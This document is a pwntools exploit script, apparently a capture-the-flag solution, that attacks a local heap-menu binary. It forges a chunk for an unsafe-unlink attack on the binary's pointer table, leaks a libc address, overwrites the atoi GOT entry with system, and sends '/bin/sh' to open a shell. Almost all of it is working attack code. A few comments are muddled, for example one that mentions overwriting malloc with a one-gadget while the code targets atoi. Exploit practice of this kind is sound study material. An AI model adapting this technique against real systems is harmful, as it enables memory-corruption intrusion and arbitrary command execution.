from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./pwn4_ul_patched', checksec=False)

p = process("./pwn4_ul_patched")

#gdb.attach(p, gdbscript='''
#vis
#''')

def create(idx,size,data):
    p.sendafter(b">\n",b"1")
    p.sendafter(b"Index:",str(idx))
    p.sendafter(b"Input size:", str(size))
    p.sendafter(b"Input data:",data)

def show(idx):
    p.sendafter(b">\n",b"2")
    p.sendafter(b"Index:",str(idx))

def edit(index,newsize,data):
    p.sendafter(b">\n",b"3")
    p.sendafter(b"Input index:", str(index))
    p.sendlineafter(b"Input newsize:", str(newsize))
    p.sendlineafter(b"Do you want to change data (y/n)?\n",b"y")
    p.sendafter(b"Input data:",data)

def delete(idx):
    p.sendafter(b">\n",b"4")
    p.sendafter(b"Input index:", str(idx))

create(0, 0x80 ,b"\x01")
create(1, 0x80, b"\x02")
create(2, 0x80, b"\x03")
create(3, 0x80, b"\x04")         #This is the chunk we use to make fake chunk 4
create(4, 0x80, b"\x05")
create(5, 0x80, b"\x06")

store=0x6020e0
payload=p64(0)+p64(0x80)+p64(store)+p64(store+8)+b"\x00"*0x60+p64(0x80)+p64(0x90)

edit(3, 0x90, payload)

delete(4)								#free(4) but 3 in unsoftedbin because of payload made the prog think the 3 th is unsortedbin

#### stage3: leak libc ###########################################################
edit(3, 0x8, p64(0x602020))				#now all we edit chunk(3) is edit(0x6020e0). 0x6020e0 is the address of all chunk's data address
show(0)
p.recvuntil(b"Data = ")
libc=int.from_bytes(p.recv(6),"little")-424032
log.info("[+]libc base"+hex(libc))

#### stage 4 overwrite malloc with onegadget#######
atoi_got=0x602068
system=libc+0x3f550
edit(3, 8,p64(atoi_got))				#over_write atoi_got to system (readInt() func)
edit(0, 8,p64(system))
p.sendafter(b">\n",b"/bin/sh")

p.interactive()